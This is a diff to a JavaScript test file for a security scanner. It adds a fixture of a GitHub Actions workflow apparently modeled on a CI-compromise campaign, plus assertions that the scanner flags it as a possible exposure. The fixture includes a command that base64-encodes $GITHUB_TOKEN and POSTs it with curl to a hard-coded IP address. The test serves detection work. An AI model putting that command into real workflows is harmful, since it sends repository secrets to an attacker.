@@ -198,6 +198,32 @@ try {
   fs.rmSync(tmpConfigRoot, { recursive: true, force: true });
 }
 
+const tmpMegalodonWorkflowRoot = fs.mkdtempSync(path.join(__dirname, "tmp-megalodon-workflow-"));
+try {
+  fs.mkdirSync(path.join(tmpMegalodonWorkflowRoot, ".github", "workflows"), { recursive: true });
+  fs.writeFileSync(
+    path.join(tmpMegalodonWorkflowRoot, ".github", "workflows", "build.yml"),
+    [
+      "name: build",
+      "on: [push]",
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      "      - run: echo $GITHUB_TOKEN | base64 | curl -X POST http://216.126.225.129:8443/any?h=x\\&l=y\\&id=z\\&t=q --data-binary @-",
+      "      - run: echo '/root/cicd/loot ingest listener OK GET /health POST /any ?h=&l=&id=&t='"
+    ].join("\n")
+  );
+  const megalodonWorkflow = scanTarget(tmpMegalodonWorkflowRoot);
+  assert.strictEqual(megalodonWorkflow.risk, "possible-exposure");
+  assert(megalodonWorkflow.findings.some((finding) => finding.type === "network-indicator"));
+  assert(megalodonWorkflow.findings.some((finding) => finding.type === "workflow-indicator"));
+  assert(megalodonWorkflow.findings.some((finding) => finding.type === "workflow-encoded-exec"));
+  assert(megalodonWorkflow.findings.some((finding) => finding.type === "workflow-token-surface"));
+} finally {
+  fs.rmSync(tmpMegalodonWorkflowRoot, { recursive: true, force: true });
+}
+
 const payloadPath = path.join(__dirname, "fixtures", "compromised", "router_init.js");
 const payloadHash = crypto.createHash("sha256").update(fs.readFileSync(payloadPath)).digest("hex");
 const compromisedWithHash = scanTarget(path.join(__dirname, "fixtures", "compromised"), {
